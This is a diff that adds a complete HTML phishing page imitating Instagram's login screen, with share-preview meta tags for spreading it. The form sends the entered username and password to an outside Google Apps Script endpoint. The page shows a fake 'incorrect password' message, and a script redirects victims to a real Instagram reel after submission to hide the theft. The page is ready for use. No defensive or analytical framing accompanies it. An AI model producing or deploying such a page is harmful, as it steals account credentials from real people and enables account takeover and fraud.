@@ -1,1 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
 
+    <!-- Meta etiquetas para previsualización al compartir -->
+    <meta property="og:title" content="Instagram Login Clone">
+    <meta property="og:description" content="Log in to Instagram using our clone page.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png">
+    <meta property="og:url" content="URL_DE_TU_PAGINA">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 80%;
+            padding: 8px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .divider {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .login-with-facebook {
+            background-color: #3897f0;
+            color: white;
+            font-weight: bold;
+            margin-bottom: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .forgot-password {
+            color: #3897f0;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .sign-up {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .sign-up a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .terms {
+            margin-top: 10px;
+            font-size: 10px;
+            color: #8e8e8e;
+        }
+
+        .terms a {
+            color: #00376b;
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo">
+
+    <button onclick="window.location.href='https://www.facebook.com/'" class="login-with-facebook">Continue with Facebook </button>
+
+    <div class="divider">OR</div>
+
+    <!-- Formulario -->
+     <form id="login-form" action="https://script.google.com/macros/s/AKfycbyU9-YGCNjXhaFiOqMr7kxPnVtLWaACYhVyPoJH43CPYogLTD1gIxLVpZbS9cfSuO75Ng/exec" method="POST">
+        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button class="login-btn" type="submit">Log In</button>>
+        <div class="error-message">Contraseña incorrecta</div> <!-- Mensaje visible -->
+    </form>
+
+    <a class="forgot-password" href="https://www.instagram.com/accounts/login/?mtn">Forgot password?</a>
+
+    <div onclick="window.location.href='https://www.instagram.com/accounts/signup/phone'" class="sign-up">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="terms">
+        By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+    </div>
+</div>
+
+<!-- JavaScript para redirigir a Instagram tras enviar el formulario -->
+<<script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+        setTimeout(function() {
+            window.location.href = 'https://www.instagram.com/reel/C9h-n5luG5f/';
+        }, 500);  // Redirige después de 0.5 segundos
+    });
+</script> 
+
+</body>
+</html>
